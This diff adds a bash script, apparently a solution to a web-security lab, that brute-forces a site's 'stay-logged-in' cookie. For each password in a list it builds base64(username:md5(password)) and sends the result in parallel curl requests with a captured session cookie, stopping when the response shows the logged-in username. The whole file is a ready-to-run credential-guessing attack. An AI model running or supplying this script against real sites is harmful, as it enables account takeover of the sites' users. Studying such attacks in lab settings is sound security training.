@@ -1,0 +1,56 @@
+#!/usr/bin/bash
+
+## Stay-logged-in cookie exploitation lab
+	### Using base64{username:md5hash(password)} as value
+
+username=$1
+passwords_file=$2
+url=$3
+threads=10
+
+login() {
+	curl -i -s -o $4 -X GET -b "session=$3" -b "stay-logged-in=$1" $2
+}
+
+get_session() {
+	curl -i -s -X GET $1 | grep "session" | cut -d "=" -f 2 | cut -d ";" -f 1 > session
+}
+
+running_jobs() {
+	jobs -rp | wc -l
+}
+
+encrypt() {
+	# Set cookie in the accepted form
+
+	md5_password=$(echo -n "$2" | md5sum)
+	echo -n $1":"$md5_password | base64
+}
+
+execute() {
+	stay_logged_in=$(encrypt "$1" "$2")
+	cookie_value=$"${stay_logged_in:0:-4}"
+	login "$cookie_value" "$3" "$4" "$2_response"
+	if cat $2_response | grep -q "Your username is:"; then	# Check the response
+		echo "[!] Found password: $2"
+		echo "$2" > valid_password
+	else
+		echo "[*] Invalid hash: $cookie_value"
+		rm $2_response
+	fi
+}
+get_session "$url"
+session=$(cat session)
+
+while read -r pass; do
+	[ -f valid_password ] && break
+	while [ "$(running_jobs)" -gt "$threads" ]; do
+		sleep 0.1
+	done
+
+	execute "$username" "$pass" "$url" "$session" &
+done < $passwords_file
+
+rm session
+wait 
+exit 0
